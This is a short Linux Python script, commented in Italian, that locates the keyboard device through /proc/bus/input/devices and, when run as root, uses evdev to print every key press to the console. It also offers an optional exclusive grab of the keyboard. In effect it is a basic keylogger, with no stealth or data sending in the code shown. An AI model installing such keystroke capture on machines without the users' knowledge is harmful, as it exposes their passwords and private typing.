import re
import os
import sys
from evdev import InputDevice, categorize, ecodes

def get_keyboard_path():
    """Analizza /proc/bus/input/devices per trovare il device della tastiera."""
    path = "/proc/bus/input/devices"
    if not os.path.exists(path):
        return None

    with open(path, 'r') as f:
        devices_info = f.read()

    # Dividiamo per blocchi di dispositivo
    blocks = devices_info.split('\n\n')
    for block in blocks:
        # Cerchiamo la capacità EV=120013 (standard per tastiere con tasti ripetuti)
        # o la presenza della stringa "keyboard" nel nome
        if "EV=120013" in block or "keyboard" in block.lower():
            match = re.search(r'Handlers=.*(event\d+)', block)
            if match:
                return f"/dev/input/{match.group(1)}"
    return None

def start_logger():
    kbd_path = get_keyboard_path()
    
    if not kbd_path:
        print("[-] Errore: Impossibile trovare una tastiera valida.")
        return

    print(f"[*] Tastiera individuata su: {kbd_path}")

    try:
        # Tentativo di aggancio al device
        device = InputDevice(kbd_path)
        print(f"[*] In ascolto su: {device.name} (Premi Ctrl+C per fermare)")
        
        # Grab esclusivo (opzionale): decommenta la riga sotto se vuoi che 
        # i tasti NON arrivino alle altre app mentre lo script gira.
        # device.grab()

        for event in device.read_loop():
            if event.type == ecodes.EV_KEY:
                key_event = categorize(event)
                # keystate 1 = premuto, 0 = rilasciato, 2 = tenuto premuto
                if key_event.keystate == 1:
                    print(f"[KEY] {key_event.keycode}")
                    
    except PermissionError:
        print("[-] Errore di permessi: Devi eseguire lo script con 'sudo'.")
    except KeyboardInterrupt:
        print("\n[*] Arresto in corso...")
    except Exception as e:
        print(f"[-] Errore imprevisto: {e}")

if __name__ == "__main__":
    # Verifica se l'utente è root (necessario per /dev/input/)
    if os.geteuid() != 0:
        print("!!! ATTENZIONE: Questo script richiede privilegi di ROOT !!!")
        print("Lancialo con: sudo python script.py")
        sys.exit(1)
        
    start_logger()
